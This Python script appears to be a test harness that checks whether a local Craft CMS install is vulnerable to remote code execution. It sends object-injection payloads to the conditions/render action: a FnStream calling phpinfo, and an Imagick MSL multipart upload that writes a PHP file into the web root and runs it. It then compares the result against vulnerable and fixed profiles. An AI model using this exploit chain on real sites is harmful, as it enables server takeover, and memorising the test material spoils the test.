"""Real Craft administration, rendering and object-construction controls."""
from pathlib import Path
import base64
import hashlib
import html
import html.parser
import http.cookiejar
import json
import os
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

CATALOG = json.loads(Path('/opt/module-target/releases.json').read_text())
PROFILE = CATALOG['profiles'][sys.argv[1]]
RELEASE = CATALOG['releases'][PROFILE['version']]
BASELINE = Path('/tmp/module-target-craft-baseline.json')
PRESERVED = Path('/tmp/phpMcvA01')
PRESERVED_BYTES = b'<image><read filename="xc:blue"/></image>\n'
WEB = Path('/app/web/module-target-native-control.php')
PROOF = Path('/tmp/module-target-craft-native-proof')
MSL = Path('/tmp/module-target-craft-native.msl')
HTTP = []
CHECKS = []


class Inputs(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.values = {}

    def handle_starttag(self, tag, attrs):
        values = dict(attrs)
        if tag == 'input' and values.get('name'):
            self.values[values['name']] = values.get('value', '')


def php(code):
    result = subprocess.run(['php', '-r', code], cwd='/app', capture_output=True, text=True, timeout=30)
    if result.returncode:
        raise RuntimeError('Native PHP operation failed: ' + result.stderr)
    return json.loads(result.stdout)


def application(code):
    return php("require '/app/bootstrap.php';$app=require CRAFT_VENDOR_PATH.'/craftcms/cms/bootstrap/console.php';" + code)


def opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))


def request(label, path='/', data=None, client=None, content_type=None, headers=None):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    values = dict(headers or {})
    if content_type:
        values['Content-Type'] = content_type
    req = urllib.request.Request('http://127.0.0.1:8080' + path, data=data, headers=values)
    try:
        response = (client or opener()).open(req, timeout=30)
    except urllib.error.HTTPError as error:
        response = error
    body = response.read()
    HTTP.append({'label': label, 'method': req.get_method(), 'path': path,
                 'request_base64': base64.b64encode(data or b'').decode(),
                 'status': response.code, 'response_url': response.url,
                 'response_base64': base64.b64encode(body).decode()})
    return response.code, response.url, body


def check(name, passed):
    CHECKS.append({'name': name, 'passed': bool(passed)})


def masters():
    found = {}
    for directory in Path('/proc').glob('[0-9]*'):
        try:
            args = directory.joinpath('cmdline').read_bytes().replace(b'\0', b' ').decode(errors='replace')
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
        for kind, token in [('nginx', 'nginx: master process'), ('fpm', 'php-fpm: master process'), ('supervisor', '/usr/bin/supervisord')]:
            if token in args and not args.startswith('php -r '):
                found[kind] = int(directory.name)
    return found


def state():
    database = application("$site=$app->getSites()->getPrimarySite();$user=$app->getDb()->createCommand('SELECT id,username,admin,password FROM users')->queryOne();echo json_encode(['site'=>['id'=>$site->id,'name'=>$site->name],'user'=>['id'=>$user['id'],'username'=>$user['username'],'admin'=>$user['admin'],'password_sha256'=>hash('sha256',$user['password'])]]);")
    paths = list(RELEASE['critical_files']) + ['/app/bootstrap.php', '/app/web/index.php', '/app/config/general.php', '/app/templates/module-target-native.twig']
    return {'database': database, 'masters': masters(),
            'sources': {path: hashlib.sha256(Path(path).read_bytes()).hexdigest() for path in paths},
            'web_php_files': sorted(path.name for path in Path('/app/web').glob('*.php')),
            'php_upload_files': sorted(path.name for path in Path('/tmp').glob('php*') if path.is_file()),
            'preserved': {'exists': PRESERVED.exists(), 'sha256': hashlib.sha256(PRESERVED.read_bytes()).hexdigest() if PRESERVED.exists() else None},
            'native_paths_absent': all(not path.exists() for path in [WEB, PROOF, MSL])}


def initialize():
    assert not BASELINE.exists() and not PRESERVED.exists()
    PRESERVED.write_bytes(PRESERVED_BYTES)
    snapshot = state()
    assert snapshot['web_php_files'] == ['index.php']
    assert snapshot['php_upload_files'] == [PRESERVED.name]
    assert len(snapshot['masters']) == 3
    BASELINE.write_text(json.dumps(snapshot, indent=2) + '\n')
    return {'initialized': True, 'snapshot': snapshot}


def multipart(xml):
    boundary = 'module-target-craft-native-control'
    fields = {'action': 'conditions/render', 'configObject[class]': 'craft\\elements\\conditions\\ElementCondition',
              'config': json.dumps({'name': 'configObject', 'as ': {'class': 'Imagick', '__construct()': {'files': 'vid:msl:/tmp/php*'}}})}
    parts = []
    for name, value in fields.items():
        parts.append('--' + boundary + '\r\nContent-Disposition: form-data; name="' + name + '"\r\n\r\n' + value + '\r\n')
    parts.append('--' + boundary + '\r\nContent-Disposition: form-data; name="native"; filename="native.msl"\r\nContent-Type: text/plain\r\n\r\n' + xml + '\r\n')
    return (''.join(parts) + '--' + boundary + '--\r\n').encode(), 'multipart/form-data; boundary=' + boundary


def audit():
    baseline = json.loads(BASELINE.read_text())
    before = state()
    check('native-state-before', before == baseline)
    installed = php("require '/app/vendor/autoload.php';echo json_encode(['version'=>Composer\\InstalledVersions::getPrettyVersion('craftcms/cms'),'reference'=>Composer\\InstalledVersions::getReference('craftcms/cms'),'uid'=>posix_geteuid()]);")
    check('installed-release-and-uid', installed == {'version': PROFILE['version'], 'reference': RELEASE['cms_reference'], 'uid': CATALOG['expected_uid']})
    check('installed-critical-sources', all(Path(path).is_file() and hashlib.sha256(Path(path).read_bytes()).hexdigest() == value['sha256'] for path, value in RELEASE['critical_files'].items()))
    status, _, body = request('frontend')
    check('ordinary-twig-frontend', status == 200 and b'Welcome to Craft CMS' in body)
    status, _, body = request('database-backed-template', '/module-target-native')
    check('database-backed-template', status == 200 and body.strip() == b'Module target native site: Module target Craft')
    status, url, _ = request('anonymous-dashboard', '/admin/dashboard')
    check('anonymous-dashboard-denied', status == 200 and url.endswith('/admin/login'))
    for valid in [False, True]:
        client = opener()
        status, _, body = request('login-form-' + str(valid), '/admin/login', client=client)
        inputs = Inputs()
        inputs.feed(body.decode())
        csrf = {name: value for name, value in inputs.values.items() if 'CSRF' in name}
        assert status == 200 and csrf
        form = dict(csrf, action='users/login', loginName='admin', password='module-target-craft-admin' if valid else 'module-target-invalid')
        status, _, body = request('login-' + str(valid), data=form, client=client, headers={'Accept': 'application/json'})
        data = json.loads(body)
        if valid:
            check('administrator-login', status == 200 and {'returnUrl', 'csrfTokenValue'}.issubset(data))
            status, url, body = request('administrator-dashboard', '/admin/dashboard', client=client)
            check('administrator-dashboard', status == 200 and '/login' not in url and b'Dashboard' in body)
        else:
            check('invalid-credentials-denied', status == 400 and data.get('errorCode') == 'invalid_credentials')
    caption = subprocess.run(['convert', 'caption:module-target-native-caption', 'info:'], capture_output=True, text=True, timeout=15)
    check('ordinary-default-caption', caption.returncode == 0 and 'CAPTION' in caption.stdout)
    form = {'action': 'conditions/render', 'configObject[class]': 'craft\\elements\\conditions\\ElementCondition',
            'config': json.dumps({'name': 'configObject', 'as ': {'class': '\\GuzzleHttp\\Psr7\\FnStream', '__construct()': {'methods': {'close': 'phpinfo'}}}})}
    status, _, body = request('condition-probe', data=form)
    exposed = all(marker in body for marker in [b'phpinfo()', b'upload_tmp_dir', b'DOCUMENT_ROOT'])
    check('condition-execution-or-fixed-refusal', (status == 500 and exposed) if PROFILE['vulnerable'] else (status == 400 and not exposed))
    php_code = "<?php file_put_contents('" + str(PROOF) + "','module-target-craft-native');echo 'native-craft-response'; ?>"
    xml = '<?xml version="1.0" encoding="UTF-8"?><image><read filename="caption:' + html.escape(php_code, quote=True) + '"/><write filename="info:' + str(WEB) + '"/></image>'
    assert all(not path.exists() for path in [WEB, PROOF, MSL])
    try:
        MSL.write_text(xml)
        rendered = subprocess.run(['php', '-r', 'new Imagick($argv[1]);', 'msl:' + str(MSL)], capture_output=True, text=True, timeout=20)
        check('independent-msl-file-write', rendered.returncode == 0 and WEB.is_file() and WEB.stat().st_uid == 82)
        status, _, body = request('independent-msl-http', '/' + WEB.name)
        check('independent-msl-php-execution', status == 200 and b'native-craft-response' in body and PROOF.read_bytes() == b'module-target-craft-native' and PROOF.stat().st_uid == 82)
        WEB.unlink()
        PROOF.unlink()
        MSL.unlink()
        data, content_type = multipart(xml)
        status, _, _ = request('multipart-probe', data=data, content_type=content_type)
        check('multipart-write-or-fixed-refusal', status == (500 if PROFILE['vulnerable'] else 400) and WEB.exists() == PROFILE['vulnerable'])
        if PROFILE['vulnerable']:
            status, _, body = request('multipart-php-execution', '/' + WEB.name)
            check('multipart-exact-proof', status == 200 and b'native-craft-response' in body and PROOF.read_bytes() == b'module-target-craft-native' and PROOF.stat().st_uid == 82)
        else:
            check('multipart-no-proof', not PROOF.exists())
    finally:
        for path in [WEB, PROOF, MSL]:
            path.unlink(missing_ok=True)
    check('preserved-baseline-upload', PRESERVED.is_file() and PRESERVED.read_bytes() == PRESERVED_BYTES)
    after = state()
    check('native-state-after', after == baseline)
    return {'checks': CHECKS, 'http': HTTP, 'snapshot': after, 'installed': installed, 'passed': all(row['passed'] for row in CHECKS)}


try:
    operation = sys.argv[2]
    if operation == 'initialize':
        result = initialize()
    elif operation == 'snapshot':
        result = state()
    elif operation == 'audit':
        result = audit()
    else:
        raise ValueError('Unknown native operation')
    print(json.dumps(result))
    if operation == 'audit' and not result['passed']:
        raise SystemExit(1)
except Exception as error:
    print(json.dumps({'operation': sys.argv[2], 'checks': CHECKS, 'http': HTTP, 'error': {'type': type(error).__name__, 'message': str(error)}}))
    raise
